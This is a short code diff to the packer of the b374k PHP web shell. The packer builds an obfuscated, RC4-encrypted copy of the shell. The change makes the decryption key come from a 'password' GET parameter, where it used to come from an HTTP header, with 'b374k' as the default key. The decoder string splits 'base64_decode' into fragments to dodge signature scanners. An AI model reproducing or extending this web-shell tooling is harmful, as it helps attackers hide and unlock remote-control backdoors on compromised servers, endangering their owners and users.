@@ -581,7 +581,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = $encoder_func."(isset(\$_SERVER[\\'HTTP_RC4_KEY\\'])?\$_SERVER[\\'HTTP_RC4_KEY\\']:\\'b374k\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
+				$encoder = $encoder_func."(isset(\$_GET[\\'password\\'])?\$_GET[\\'password\\']:\\'b374k\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
